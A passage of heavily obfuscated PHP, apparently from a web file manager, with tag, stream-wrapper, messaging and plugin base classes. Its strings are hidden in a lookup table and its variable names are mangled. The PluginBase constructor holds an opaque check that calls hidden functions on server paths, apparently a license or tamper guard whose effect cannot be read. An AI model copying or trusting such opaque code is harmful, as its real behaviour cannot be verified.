Model($Ä÷‚§Ü®[840])->move($åÜÙŸà»[$Ä÷‚§Ü®[410]], $Àò™›Â, $Ê¯†Çé­); } Model($Ä÷‚§Ü®[840])->moveClearAuth = !0; $’Ê½†ÉÜ = array($Ä÷‚§Ü®[419] => 2, $Ä÷‚§Ü®[513] => $é‰ÁÍë”); $ßÅ”®ªª = array($Ä÷‚§Ü®[513] => $ÔìòäÀ¢); Model($Ä÷‚§Ü®[1944])->where($’Ê½†ÉÜ)->save($ßÅ”®ªª); Model($Ä÷‚§Ü®[1945])->where($’Ê½†ÉÜ)->save($ßÅ”®ªª); } $this->_changeChildLevel($ä¾äÍ¨æ[$é‰ÁÍë”], $ä¾äÍ¨æ[$ÔìòäÀ¢], !0); $this->where(array($Ä÷‚§Ü®[440] => $é‰ÁÍë”))->save(array($Ä÷‚§Ü®[440] => $ÔìòäÀ¢)); $this->_clearChildrenCache($ä¾äÍ¨æ[$ÔìòäÀ¢]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($É”­îË¦) { $Ÿ×â¶ñ =& $_SERVER[™¾ÇÙ¯¹]; return array($Ÿ×â¶ñ[1946] => array($É”­îË¦[0], $Ÿ×â¶ñ[1947]), $Ÿ×â¶ñ[1948] => array($É”­îË¦[0], $Ÿ×â¶ñ[1949])); } protected function get($´à… ÈÈ) { $Õü¹ñÛš =& $_SERVER[™¾ÇÙ¯¹]; $äÁù–¡ = Model($Õü¹ñÛš[530])->metaGet($´à… ÈÈ, $Õü¹ñÛš[1950]); $ï«Ã‡š„ = json_decode($äÁù–¡, !0); return $ï«Ã‡š„ ? $ï«Ã‡š„ : array($Õü¹ñÛš[1951] => $Õü¹ñÛš[88], $Õü¹ñÛš[378] => array()); } protected function set($©õöœç…, $­µê³×Í) { $ŸíùµìÑ =& $_SERVER[™¾ÇÙ¯¹]; $­µê³×Í = $­µê³×Í ? $­µê³×Í : array($ŸíùµìÑ[1951] => $ŸíùµìÑ[88], $ŸíùµìÑ[378] => array()); return Model($ŸíùµìÑ[530])->metaSet($©õöœç…, $ŸíùµìÑ[1950], json_encode($­µê³×Í)); } protected function getByTagID($ÙÕ“şÆî, $í©úô´ë) { $éºÇãÛë =& $_SERVER[™¾ÇÙ¯¹]; if (!$ÙÕ“şÆî || !$í©úô´ë) { return !1; } if (!Model($éºÇãÛë[530])->getInfoSimple($ÙÕ“şÆî)) { return !1; } $ ÏÄ­¦Œ = $this->get($ÙÕ“şÆî); if (!$ ÏÄ­¦Œ || !isset($ ÏÄ­¦Œ[$éºÇãÛë[378]])) { return !1; } $ºÜ¹„½ = array_find_by_field($ ÏÄ­¦Œ[$éºÇãÛë[378]], $éºÇãÛë[407], $í©úô´ë); return is_array($ºÜ¹„½) ? $ºÜ¹„½ : !1; } public function listSource($Ú­ß†æÕ, $Õå…Ş¶À) { $ªãú÷ßê =& $_SERVER[™¾ÇÙ¯¹]; if ($Õå…Ş¶À && !is_array($Õå…Ş¶À)) { $Õå…Ş¶À = array($Õå…Ş¶À); } $ö¥ëÑŞ´ = $this->listData($Ú­ß†æÕ); $¬ñó«ïÇ = array(); foreach ($ö¥ëÑŞ´ as $¯™ŸÃ¼¼) { $ÄÉ—Ç­ = $¯™ŸÃ¼¼[$ªãú÷ßê[84]]; if (!$ÄÉ—Ç­) { continue; } if (!isset($¬ñó«ïÇ[$ÄÉ—Ç­])) { $¬ñó«ïÇ[$ÄÉ—Ç­] = array(); } $¬ñó«ïÇ[$ÄÉ—Ç­][] = $¯™ŸÃ¼¼[$ªãú÷ßê[434]]; } $«¨è²ã¯ = array(); foreach ($¬ñó«ïÇ as $ŞÌ¼ô¬ => $æœŒ®Õ) { $ µ¸ùğ› = !0; if (!$Õå…Ş¶À) { $«¨è²ã¯[] = $ŞÌ¼ô¬; continue; } foreach ($Õå…Ş¶À as $¸Šú‡Š°) { if (!in_array($¸Šú‡Š°, $æœŒ®Õ)) { $ µ¸ùğ› = !1; break; } } if ($ µ¸ùğ›) { $«¨è²ã¯[] = $ŞÌ¼ô¬; } } if (!$«¨è²ã¯) { return array(); } $ñØ½ğÉ = array($ªãú÷ßê[425] => array($ªãú÷ßê[426], $«¨è²ã¯), $ªãú÷ßê[513] => $Ú­ß†æÕ, $ªãú÷ßê[419] => SourceModel::TYPE_GROUP); $øÃ‹œÃİ = Model($ªãú÷ßê[1335])->listSource($ñØ½ğÉ); if (!$øÃ‹œÃİ || count($«¨è²ã¯) == $øÃ‹œÃİ[$ªãú÷ßê[375]][$ªãú÷ßê[376]]) { return $øÃ‹œÃİ; } $¬ı¤ë = array(); $Ø»ÜÎ°× = array_to_keyvalue($øÃ‹œÃİ[$ªãú÷ßê[82]], $ªãú÷ßê[12], $ªãú÷ßê[410]); $·…Şî¿ñ = array_to_keyvalue($øÃ‹œÃİ[$ªãú÷ßê[83]], $ªãú÷ßê[12], $ªãú÷ßê[410]); $İÖ£ùø = array_merge($·…Şî¿ñ, $Ø»ÜÎ°×); foreach ($«¨è²ã¯ as $ÄÉ—Ç­) { if (!in_array($ÄÉ—Ç­, $İÖ£ùø)) { $¬ı¤ë[] = $ÄÉ—Ç­; } } if ($¬ı¤ë) { $this->removeBySource($Ú­ß†æÕ, $¬ı¤ë); } return $øÃ‹œÃİ; } protected function listData($´ÄÎØ¤) { $óÅ™€º— =& $_SERVER[™¾ÇÙ¯¹]; $İ»Ù¦€À = array($óÅ™€º—[1656] => 0, $óÅ™€º—[492] => array($óÅ™€º—[1952], 0), $óÅ™€º—[430] => $óÅ™€º—[1953] . $´ÄÎØ¤); $è éĞÑ = $óÅ™€º—[1954]; $µ´ÔéşÛ = $this->field($è éĞÑ)->where($İ»Ù¦€À)->order($óÅ™€º—[1955])->select(); return $µ´ÔéşÛ ? $µ´ÔéşÛ : array(); } protected function addToTag($¦É€Õğ‰, $üÒİ¯ºã, $ı©¡†·) { $ƒó’ç¡“ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->getByTagID($¦É€Õğ‰, $ı©¡†·) || !$üÒİ¯ºã) { return !1; } if (!Model($ƒó’ç¡“[840])->pathInfo($üÒİ¯ºã)) { return !1; } $ˆ¢Øë = array($ƒó’ç¡“[1656] => 0, $ƒó’ç¡“[492] => $ı©¡†·, $ƒó’ç¡“[429] => $üÒİ¯ºã, $ƒó’ç¡“[430] => $ƒó’ç¡“[1956] . $¦É€Õğ‰, $ƒó’ç¡“[428] => $ƒó’ç¡“[12], $ƒó’ç¡“[1841] => 0); if ($this->where($ˆ¢Øë)->find()) { return !1; } return $this->add($ˆ¢Øë); } protected function removeFromTag($ïìŒ´ƒ, $ƒ˜œÆà, $ê“ÁŒöÄ) { $¾ğŠ‹çû =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->getByTagID($ïìŒ´ƒ, $ê“ÁŒöÄ) || !$ƒ˜œÆà) { return !1; } if (is_array($ƒ˜œÆà)) { $ƒ˜œÆà = array($¾ğŠ‹çû[7], $ƒ˜œÆà); } $Şê•¬Ÿ€ = array($¾ğŠ‹çû[1656] => 0, $¾ğŠ‹çû[492] => $ê“ÁŒöÄ, $¾ğŠ‹çû[430] => $¾ğŠ‹çû[1956] . $ïìŒ´ƒ, $¾ğŠ‹çû[429] => $ƒ˜œÆà); return $this->where($Şê•¬Ÿ€)->delete(); } protected function removeByTag($«±ç¬», $…ğîê¢‘) { $ü®ä–Û¹ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->getByTagID($«±ç¬», $…ğîê¢‘)) { return !1; } $—›÷¦Ğ = array($ü®ä–Û¹[1656] => 0, $ü®ä–Û¹[492] => $…ğîê¢‘, $ü®ä–Û¹[430] => $ü®ä–Û¹[1956] . $«±ç¬»); return $this->where($—›÷¦Ğ)->delete(); } protected function removeBySource($¥³¤½¨‰, $™¬êöå”) { $÷ñÉ‘Ë• =& $_SERVER[™¾ÇÙ¯¹]; if (!$¥³¤½¨‰ || !$™¬êöå”) { return !1; } if (is_array($™¬êöå”)) { $™¬êöå” = array($÷ñÉ‘Ë•[7], $™¬êöå”); } $–¥ÂÃñÑ = array($÷ñÉ‘Ë•[1656] => 0, $÷ñÉ‘Ë•[429] => $™¬êöå”, $÷ñÉ‘Ë•[492] => array($÷ñÉ‘Ë•[1022], 0), $÷ñÉ‘Ë•[430] => $÷ñÉ‘Ë•[1956] . $¥³¤½¨‰); return $this->where($–¥ÂÃñÑ)->delete(); } } goto cÈ‚ÈÙ«¢; BÅùËÎâÁ¹: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($½ÍÏ•¨ı, $´ÈŞ™› = '') { $this->info = $this->info($½ÍÏ•¨ı); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[™¾ÇÙ¯¹][84]]; $this->pathOpen = $½ÍÏ•¨ı; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$½ÍÏ•¨ı])) { self::$_chunkBuffer[$½ÍÏ•¨ı] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($±’ıƒÄü) { $ŸÏ×±çÓ = $this->fileSubstr($this->pose, $±’ıƒÄü); $this->pose += strlen($ŸÏ×±çÓ); return $ŸÏ×±çÓ; } public function stream_tell() { return $this->pose; } public function stream_seek($¾º±–øµ, $£œÅÁ¼Î) { $õú½ª…« =& $_SERVER[™¾ÇÙ¯¹]; if ($£œÅÁ¼Î == SEEK_SET) { $this->pose = $¾º±–øµ; } else { if ($£œÅÁ¼Î == SEEK_CUR) { $this->pose += $¾º±–øµ; } else { if ($£œÅÁ¼Î == SEEK_END) { $this->pose = $this->info[$õú½ª…«[76]] + intval($¾º±–øµ); } } } if ($¾º±–øµ < 0) { $this->pose = $this->info[$õú½ª…«[76]] + $¾º±–øµ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[™¾ÇÙ¯¹][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Û•±—Ø, $ŒØ¡¼¯ì) { $•°Ñş =& $_SERVER[™¾ÇÙ¯¹]; $µîÁğ“õ = $this->info($Û•±—Ø); return array($•°Ñş[1511] => 0, $•°Ñş[1512] => 0, $•°Ñş[16] => 32768 + 511, $•°Ñş[1513] => 0, $•°Ñş[1514] => 0, $•°Ñş[1515] => 0, $•°Ñş[1516] => 0, $•°Ñş[76] => $µîÁğ“õ[$•°Ñş[76]], $•°Ñş[1517] => $µîÁğ“õ[$•°Ñş[1385]], $•°Ñş[1473] => $µîÁğ“õ[$•°Ñş[85]], $•°Ñş[1472] => $µîÁğ“õ[$•°Ñş[200]], $•°Ñş[1518] => 0, $•°Ñş[1519] => 0); } static $fileInfo = array(); public function info($…Ä‰Ú±) { $ü±İ–é‰ = $_SERVER[™¾ÇÙ¯¹][1520]; if (isset(self::$fileInfo[$…Ä‰Ú±])) { return self::$fileInfo[$…Ä‰Ú±]; } if (substr($…Ä‰Ú±, 0, strlen($ü±İ–é‰)) != $ü±İ–é‰) { return !1; } self::$fileInfo[$…Ä‰Ú±] = IO::info(substr($…Ä‰Ú±, strlen($ü±İ–é‰))); return self::$fileInfo[$…Ä‰Ú±]; } public static function read($¦³£ËçÑ, $Öı´œÕ„, $ÛˆÅåÛ) { if (!isset(self::$_fopenCache[$¦³£ËçÑ])) { $Ê¨’±–Æ = new StreamWrapperIO(); $Ê¨’±–Æ->stream_open($¦³£ËçÑ); self::$_fopenCache[$¦³£ËçÑ] = $Ê¨’±–Æ; } $Ê¨’±–Æ = self::$_fopenCache[$¦³£ËçÑ]; return $Ê¨’±–Æ->fileSubstr($Öı´œÕ„, $ÛˆÅåÛ); } public static function _read($“¸÷‚™˜, $îŞ›©Ù, $òæÆöÚº) { $æš¡†åß =& $_SERVER[™¾ÇÙ¯¹]; $Ó«Ğ¯Ì = fopen($“¸÷‚™˜, $æš¡†åß[1389]); if (!$Ó«Ğ¯Ì) { return $æš¡†åß[12]; } $„ßØëÍ = 8192; fseek($Ó«Ğ¯Ì, $îŞ›©Ù, SEEK_SET); $•ÉùÁ¡ó = $æš¡†åß[12]; $å¶µÍè² = 0; while ($å¶µÍè² < $òæÆöÚº) { $µãÏöÏŸ = min($„ßØëÍ, $òæÆöÚº - $å¶µÍè²); $•ÉùÁ¡ó .= fread($Ó«Ğ¯Ì, $µãÏöÏŸ); $å¶µÍè² += $µãÏöÏŸ; } fclose($Ó«Ğ¯Ì); return $•ÉùÁ¡ó; } public function fileSubstr($«’Æõ, $Á¥½¤½) { $Ù³½ËÜ³ =& $_SERVER[™¾ÇÙ¯¹]; $ôÂİ™› = $this->info[$Ù³½ËÜ³[76]]; $¶ó€åÌ£ = $«’Æõ; $¯å’½¼Å = $Á¥½¤½; if ($«’Æõ < 0) { $«’Æõ = $ôÂİ™› + $«’Æõ; } if ($Á¥½¤½ === !1) { $Á¥½¤½ = $ôÂİ™› - $«’Æõ; } if ($«’Æõ + $Á¥½¤½ > $ôÂİ™›) { $Á¥½¤½ = $ôÂİ™› - $«’Æõ; } if ($Á¥½¤½ <= 0) { return $Ù³½ËÜ³[12]; } if ($«’Æõ < 0 || $«’Æõ >= $ôÂİ™› || $Á¥½¤½ <= 0 || $Á¥½¤½ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\x6c\145\x52\145\x61\144\40\145\x72\162\x6f\x72\41\40\163\x74\141\162\x74\x3d{$«’Æõ}\x3b\154\x65\156\147\164\x68\75{$Á¥½¤½}\73\x20\163\x69\x7a\x65\x3d{$ôÂİ™›}\73"); } $ÖÛçÏäò = 64 * 1024; $öà ¹ô =& self::$_chunkBuffer[$this->path]; if (!$öà ¹ô) { $öà ¹ô = array(); } $¥–ÔïéÇ = 0; $÷Ä´©ìı = 0; $€ÛûöĞ = $Ù³½ËÜ³[12]; foreach ($öà ¹ô as $¥–ÔïéÇ => $€ÛûöĞ) { $¥–ÔïéÇ = intval($¥–ÔïéÇ); $÷Ä´©ìı = $¥–ÔïéÇ + strlen($€ÛûöĞ); if ($«’Æõ >= $÷Ä´©ìı) { continue; } if ($«’Æõ >= $¥–ÔïéÇ && $«’Æõ + $Á¥½¤½ <= $÷Ä´©ìı) { return substr($€ÛûöĞ, $«’Æõ - $¥–ÔïéÇ, $Á¥½¤½); } break; } if (count($öà ¹ô) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ù³½ËÜ³[1521], $Ù³½ËÜ³[1522] . count($öà ¹ô) . "\73\163\x74\x61\162\164\x3d{$«’Æõ}\x2c\154\145\156\x67\x74\150\x3d{$Á¥½¤½}\x3b\160\x6f\x73\145\72{$¥–ÔïéÇ}\x7e{$÷Ä´©ìı}"); throw new Exception($Ù³½ËÜ³[1523]); } $“¤µĞœ¾ = intval($«’Æõ / $ÖÛçÏäò) * $ÖÛçÏäò; $›´ê‚İ = ceil(($«’Æõ + $Á¥½¤½) / $ÖÛçÏäò) * $ÖÛçÏäò - $“¤µĞœ¾; $Ù²®¼ä™ = IO::fileSubstr($this->path, $“¤µĞœ¾, $›´ê‚İ); $öà ¹ô[$“¤µĞœ¾ . $Ù³½ËÜ³[12]] = $Ù²®¼ä™; ksort($öà ¹ô); $ÙÂºîš´ = substr($Ù²®¼ä™, $«’Æõ - $“¤µĞœ¾, $Á¥½¤½); return $ÙÂºîš´; } private function log($ä¼£‡Ÿ•, $†¸¶®¢à) { $»ÂØÇß¤ =& $_SERVER[™¾ÇÙ¯¹]; $›£…®¢Ù = timeFloat() - $this->timeStart; write_log(sprintf($»ÂØÇß¤[1524], $ä¼£‡Ÿ•, $this->info[$»ÂØÇß¤[32]], $›£…®¢Ù, $†¸¶®¢à), $»ÂØÇß¤[1191]); } } class Message { function __construct() { } public function send($Äëèì— = '', $ÃêèáŠ = array(), $ûÌÙç•½ = "\x74\145\x78\x74") { $ÚÃÊÙËã =& $_SERVER[™¾ÇÙ¯¹]; $ì‰Å˜ä = array($ÚÃÊÙËã[33] => $ÚÃÊÙËã[1525], $ÚÃÊÙËã[770] => $Äëèì—); if (in_array($ûÌÙç•½, array($ÚÃÊÙËã[1525], $ÚÃÊÙËã[1526]))) { $ì‰Å˜ä[$ÚÃÊÙËã[33]] = $ûÌÙç•½; } $ÃêèáŠ = array($ÚÃÊÙËã[523] => isset($ÃêèáŠ[$ÚÃÊÙËã[523]]) ? $ÃêèáŠ[$ÚÃÊÙËã[523]] : $ÚÃÊÙËã[12], $ÚÃÊÙËã[608] => isset($ÃêèáŠ[$ÚÃÊÙËã[608]]) ? $ÃêèáŠ[$ÚÃÊÙËã[608]] : $ÚÃÊÙËã[12]); if (empty($Äëèì—) || empty($ÃêèáŠ[$ÚÃÊÙËã[523]]) && empty($ÃêèáŠ[$ÚÃÊÙËã[608]])) { return !1; } $ñàğ Ò” = array($ÚÃÊÙËã[1466] => $ì‰Å˜ä, $ÚÃÊÙËã[1527] => $ÃêèáŠ); Hook::trigger($ÚÃÊÙËã[1528], $ñàğ Ò”); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ûÓ½æ­ =& $_SERVER[™¾ÇÙ¯¹]; if ($_SERVER[$ûÓ½æ­[244]] != $_SERVER[$ûÓ½æ­[1529]]) { $ÏŸ§½ğ‘ = $ûÓ½æ­[887]; $ú¦ó§‡Ã = $ûÓ½æ­[246]; $ñôÍ±¹¥ = $_SERVER[$ûÓ½æ­[247]] . $ûÓ½æ­[248]; $şµşË•Ë = $ú¦ó§‡Ã($ñôÍ±¹¥); $ƒ„ê‚Ş = explode($ûÓ½æ­[231], $şµşË•Ë); if (count($ƒ„ê‚Ş) < $ûÓ½æ­[627]) { $†Ûº½±¶ = $ûÓ½æ­[250]; $†Ûº½±¶(); } $í½ºÈß¥ = $ûÓ½æ­[888]; $í½ºÈß¥($_SERVER[$ûÓ½æ­[889]]); $í½ºÈß¥($_SERVER[$ûÓ½æ­[247]] . $ûÓ½æ­[1530]); $ŸÎ´¬‡Ù = 1; while ($ŸÎ´¬‡Ù > 1) { $ŸÎ´¬‡Ù = $ŸÎ´¬‡Ù + 4; $­œÊ­š§ = rawurlencode($ŸÎ´¬‡Ù . $ûÓ½æ­[252]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ûÓ½æ­[1531]); $this->pluginName = str_replace($ûÓ½æ­[1531], $ûÓ½æ­[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ûÓ½æ­[8]; $this->pluginApi = appHostGet() . $ûÓ½æ­[1532] . $this->pluginName . $ûÓ½æ­[8]; $this->pluginHost = $config[$ûÓ½æ­[1533]] . $this->pluginName . $ûÓ½æ­[8]; $this->pluginHostDefault = $config[$ûÓ½æ­[1533]] . $this->pluginName . $ûÓ½æ­[8]; $âñÔ¥ÎÜ = $config[$ûÓ½æ­[1534]]; if ($âñÔ¥ÎÜ && strpos($ûÓ½æ­[50] . $âñÔ¥ÎÜ . $ûÓ½æ­[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ûÓ½æ­[1535]] . $this->pluginName . $ûÓ½æ­[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[™¾ÇÙ¯¹][1536]); } protected function assign($¦Æª€Œé, $ËÙ½á’å = false) { if (is_array($¦Æª€Œé)) { $this->values = array_merge($this->values, $¦Æª€Œé); } else { $this->values[$¦Æª€Œé] = $ËÙ½á’å; } } protected function display($ìçÚ²îå) { extract($this->values); require $ìçÚ²îå; } final function hookRegist($ïñ°²×ç) { $this->modelPlugin->appRegist($this->pluginName, $ïñ°²×ç); } final function appIcon() { $›ÒÁ¤ =& $_SERVER[™¾ÇÙ¯¹]; $‹ÅÎˆ¨˜ = $this->appPackage(); $€™µ¼áï = $›ÒÁ¤[12]; if (isset($‹ÅÎˆ¨˜[$›ÒÁ¤[424]])) { if (isset($‹ÅÎˆ¨˜[$›ÒÁ¤[424]][$›ÒÁ¤[1537]])) { $€™µ¼áï = $›ÒÁ¤[1538] . $‹ÅÎˆ¨˜[$›ÒÁ¤[424]][$›ÒÁ¤[1537]] . $›ÒÁ¤[1539]; } else { if ($‹ÅÎˆ¨˜[$›ÒÁ¤[424]][$›ÒÁ¤[1540]]) { $€™µ¼áï = $›ÒÁ¤[1541] . $‹ÅÎˆ¨˜[$›ÒÁ¤[424]][$›ÒÁ¤[1540]] . $›ÒÁ¤[1542]; } } } return $€™µ¼áï; } final function fileCanView($à‡ù°¦¾) { $ëıÄùô® =& $_SERVER[™¾ÇÙ¯¹]; if (request_url_safe($à‡ù°¦¾)) { return !0; } if ($this->isShare($à‡ù°¦¾)) { return !0; } $‘Ëª—âú = Session::get($ëıÄùô®[1543]); if (!$‘Ëª—âú || !$‘Ëª—âú[$ëıÄùô®[1544]]) { $èÉ ½Ş = $ëıÄùô®[1545] . rawurlencode(this_url()); show_tips(LNG($ëıÄùô®[1546]) . $ëıÄùô®[1547] . $èÉ ½Ş . $ëıÄùô®[1548] . LNG($ëıÄùô®[1549]) . $ëıÄùô®[1550], !1); } if (!Action($ëıÄùô®[1551])->authCan($ëıÄùô®[1552])) { show_tips(LNG($ëıÄùô®[1553]) . $ëıÄùô®[1554], !1); } ActionCall($ëıÄùô®[1555], $à‡ù°¦¾); } final function isShare($Õ½®±¬”) { $ÖâË¹×¹ = KodIO::parse($Õ½®±¬”); return $ÖâË¹×¹[$_SERVER[™¾ÇÙ¯¹][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ãæú¯Ã‘) { if (request_url_safe($Ãæú¯Ã‘)) { return $Ãæú¯Ã‘; } if (!$this->isShare($Ãæú¯Ã‘)) { $Ãæú¯Ã‘ = $this->filePath($Ãæú¯Ã‘); } return Action($_SERVER[™¾ÇÙ¯¹][1183])->linkOut($Ãæú¯Ã‘); } public function filePathLinkOut($Şû¦Ÿ´î) { if (request_url_safe($Şû¦Ÿ´î)) { return $Şû¦Ÿ´î; } $this->fileCanView($Şû¦Ÿ´î); return Action($_SERVER[™¾ÇÙ¯¹][1183])->link($Şû¦Ÿ´î); } final function filePath($ÙÙ×¸á) { $ÍãØòÛ× =& $_SERVER[™¾ÇÙ¯¹]; if ($¨ŞÊŞ½ = $this->checkSharePath($ÙÙ×¸á)) { Hook::trigger($ÍãØòÛ×[1556], $¨ŞÊŞ½); return $¨ŞÊŞ½; } $this->fileCanView($ÙÙ×¸á); if (request_url_safe($ÙÙ×¸á)) { $Ì¼óĞõÎ = parse_url_query($ÙÙ×¸á); if (isset($Ì¼óĞõÎ[$ÍãØòÛ×[1557]]) && isset($Ì¼óĞõÎ[$ÍãØòÛ×[213]])) { $¹Èô‚¯¨ = Model($ÍãØòÛ×[785])->get($ÍãØòÛ×[786]); $üş¡¹À… = Mcrypt::decode($Ì¼óĞõÎ[$ÍãØòÛ×[213]], $¹Èô‚¯¨); if ($üş¡¹À…) { $this->fileInfo = IO::infoWithChildren($üş¡¹À…); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $üş¡¹À…; } } $ÙÙ×¸á = $this->_cacheHttpFile($ÙÙ×¸á); $this->fileInfo = IO::infoWithChildren($ÙÙ×¸á); } else { $this->fileInfo = IO::infoWithChildren($ÙÙ×¸á); if (!$this->fileInfo) { show_tips(LNG($ÍãØòÛ×[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ÍãØòÛ×[1556], $ÙÙ×¸á); return $ÙÙ×¸á; } final function _cacheHttpFile($¢ÒŒã•´) { $¯Ôşöè = hash_path($¢ÒŒã•´, !0); $this->cachePath = $this->pluginCachePath($¯Ôşöè); if ($¿·¼íØ¾ = IO::fileNameExist($this->cachePath, $¯Ôşöè)) { return KodIO::make($¿·¼íØ¾); } $Ä¦÷‚“¨ = $this->cachePath . $¯Ôşöè; return $this->pluginCacheFileSet($Ä¦÷‚“¨, file_get_contents_nossl($¢ÒŒã•´)); } final function _tmpFileName($—§·¶®… = array()) { $Á…ªÄõÂ =& $_SERVER[™¾ÇÙ¯¹]; if (!$—§·¶®…) { $—§·¶®… = $this->fileInfo; } if (isset($—§·¶®…[$Á…ªÄõÂ[177]])) { return $—§·¶®…[$Á…ªÄõÂ[177]]; } if (isset($—§·¶®…[$Á…ªÄõÂ[170]][$Á…ªÄõÂ[177]])) { return $—§·¶®…[$Á…ªÄõÂ[170]][$Á…ªÄõÂ[177]]; } $Şš¨ÜıŠ = IO::hashSimple($—§·¶®…[$Á…ªÄõÂ[84]]); if ($Şš¨ÜıŠ) { return $Şš¨ÜıŠ; } $Ø Ñ‹ = array($—§·¶®…[$Á…ªÄõÂ[32]], $—§·¶®…[$Á…ªÄõÂ[84]], $—§·¶®…[$Á…ªÄõÂ[76]]); if (isset($—§·¶®…[$Á…ªÄõÂ[529]])) { $Ø Ñ‹[] = $—§·¶®…[$Á…ªÄõÂ[529]]; } return md5(implode($Á…ªÄõÂ[11], $Ø Ñ‹)); } final function checkSharePath($ç´ãº¨¢) { $Ó¢èÊëƒ =& $_SERVER[™¾ÇÙ¯¹]; if (!defined($Ó¢èÊëƒ[483])) { define($Ó¢èÊëƒ[522], 0); } if (!$this->isShare($ç´ãº¨¢)) { return !1; } $˜Ï–áÃ¸ = Action($Ó¢èÊëƒ[1183])->sharePathInfo($ç´ãº¨¢); if (!isset($˜Ï–áÃ¸[$Ó¢èÊëƒ[84]])) { show_json(LNG($Ó¢èÊëƒ[1558]), !1); } $this->fileInfo = $˜Ï–áÃ¸[$Ó¢èÊëƒ[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$Ó¢èÊëƒ[177]]); return $˜Ï–áÃ¸[$Ó¢èÊëƒ[84]]; } final function pluginCachePath($€ºòş°ƒ = '') { $ùş¸ ¤ =& $_SERVER[™¾ÇÙ¯¹]; $›ãµŸÙ = IO_PATH_SYSTEM_TEMP . $ùş¸ ¤[1559] . $this->pluginName; if (!($Ã—°š…… = IO::infoFull($›ãµŸÙ))) { return IO::mkdir($›ãµŸÙ . $ùş¸ ¤[8] . $€ºòş°ƒ); } if (empty($€ºòş°ƒ)) { return $Ã—°š……[$ùş¸ ¤[84]]; } if (!($Õœ Ğ“ú = IO::fileNameExist($Ã—°š……[$ùş¸ ¤[84]], $€ºòş°ƒ))) { return IO::mkdir($Ã—°š……[$ùş¸ ¤[84]] . $€ºòş°ƒ); } return KodIO::make($Õœ Ğ“ú); } final function pluginCacheFileSet($±ïœÈ¬©, $Òå’ƒ = '') { $Ú¦ÉÍ…É =& $_SERVER[™¾ÇÙ¯¹]; if (!($ğÊĞæî = IO::infoFull($±ïœÈ¬©))) { return IO::mkfile($±ïœÈ¬©, $Òå’ƒ, REPEAT_REPLACE); } IO::setContent($ğÊĞæî[$Ú¦ÉÍ…É[84]], $Òå’ƒ); return $ğÊĞæî[$Ú¦ÉÍ…É[84]]; } final function pluginLocalFile($õƒãúÀı = '') { $óê÷”‘¨ =& $_SERVER[™¾ÇÙ¯¹]; $¿’•¸º¨ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¿’•¸º¨)) { mk_dir($¿’•¸º¨); } if (!$õƒãúÀı) { return $¿’•¸º¨; } $ç‘ìí¹Ò = IO::info($õƒãúÀı); $›ñ±¦¸· = $this->_tmpFileName($ç‘ìí¹Ò) . $óê÷”‘¨[10] . $ç‘ìí¹Ò[$óê÷”‘¨[174]]; if (!checkExtSafe($›ñ±¦¸·)) { $›ñ±¦¸· = $›ñ±¦¸· . $óê÷”‘¨[1560]; } $ÃÅ—í° = $¿’•¸º¨ . $›ñ±¦¸·; if (@file_exists($ÃÅ—í°)) { return $ÃÅ—í°; } return IO::copy($õƒãúÀı, $¿’•¸º¨, 0, $›ñ±¦¸·); } final function appPackage() { $¢¨©ŸêÏ =& $_SERVER[™¾ÇÙ¯¹]; if ($this->packageData) { return $this->packageData; } $ã„í’îç = $this->parseFile($this->pluginPath . $¢¨©ŸêÏ[1561]); $this->parseLang($ã„í’îç); $“şñÙïæ = json_decode_force($ã„í’îç); if (!$“şñÙïæ) { return array(); } $§“Åîù¾ = Hook::trigger($¢¨©ŸêÏ[1562], $“şñÙïæ); if ($§“Åîù¾ && is_array($§“Åîù¾)) { $“şñÙïæ = $§“Åîù¾; } $this->packageData = $“şñÙïæ; return $“şñÙïæ; } public function packageInfoGet($š¢¬ü§é) { $¬¶ß­šÉ = $this->appPackage(); return array_get_value($¬¶ß­šÉ, $š¢¬ü§é); } public function packageVersion() { return $this->packageInfoGet($_SERVER[™¾ÇÙ¯¹][1563]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[™¾ÇÙ¯¹][1564]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[™¾ÇÙ¯¹][1565]); } public function echoJsAssign($—àÀüÕµ, $Ä³´ƒŒê) { $this->echoJsAssignArr[$—àÀüÕµ] = $Ä³´ƒŒê; } private function parseFile($Şˆ¿¤Ğ·) { $Ïê€Â¦ =& $_SERVER[™¾ÇÙ¯¹]; $ÉÕØÙÛ¢ = file_get_contents_nossl($Şˆ¿¤Ğ·); $ÇÏ¾Õ¶Ê = array($Ïê€Â¦[1566], $Ïê€Â¦[1567], $Ïê€Â¦[1568], $Ïê€Â¦[1569], $Ïê€Â¦[1570], $Ïê€Â¦[1571], $Ïê€Â¦[1572]); $ä®¹Ò¡ = 